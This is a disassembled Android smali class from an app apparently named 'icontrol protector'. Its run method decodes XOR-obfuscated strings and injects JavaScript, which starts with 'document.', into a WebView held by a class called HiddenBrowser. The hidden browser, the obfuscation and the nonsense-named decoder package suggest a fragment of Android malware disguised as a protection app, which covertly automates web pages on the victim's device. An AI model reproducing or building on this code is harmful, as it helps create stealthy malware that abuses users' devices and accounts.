.class Lcom/icontrol/protector/HiddenBrowser$c;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/HiddenBrowser;->o([Ljava/lang/String;Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Ljava/lang/String;

.field final synthetic f:Lcom/icontrol/protector/HiddenBrowser;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/HiddenBrowser;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$c;->f:Lcom/icontrol/protector/HiddenBrowser;

    iput-object p2, p0, Lcom/icontrol/protector/HiddenBrowser$c;->e:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    :try_start_0
    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser$c;->f:Lcom/icontrol/protector/HiddenBrowser;

    invoke-static {v0}, Lcom/icontrol/protector/HiddenBrowser;->d(Lcom/icontrol/protector/HiddenBrowser;)Landroid/webkit/WebView;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v2, 0x20

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/icontrol/protector/HiddenBrowser$c;->e:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v2, 0x2

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v3, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/webkit/WebView;->evaluateJavascript(Ljava/lang/String;Landroid/webkit/ValueCallback;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void

    :array_0
    .array-data 1
        0x5t
        0x52t
        0x35t
        0x46t
        0x4at
        -0x69t
        0x24t
        0x3t
        0x4ft
        0x5ct
        0x35t
        0x47t
        0x4et
        -0x7ct
        0x2ft
        0x32t
        0xdt
        0x58t
        0x3bt
        0x56t
        0x49t
        -0x7at
        0x64t
        0x1t
        0x0t
        0x51t
        0x23t
        0x56t
        0x7t
        -0x31t
        0x6at
        0x50t
    .end array-data

    :array_1
    .array-data 1
        0x61t
        0x3dt
        0x56t
        0x33t
        0x27t
        -0xet
        0x4at
        0x77t
    .end array-data

    :array_2
    .array-data 1
        -0xct
        0x7ft
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x2dt
        0x44t
        0x53t
        -0x33t
        0x21t
        0xct
        0x7ct
        -0x11t
    .end array-data
.end method
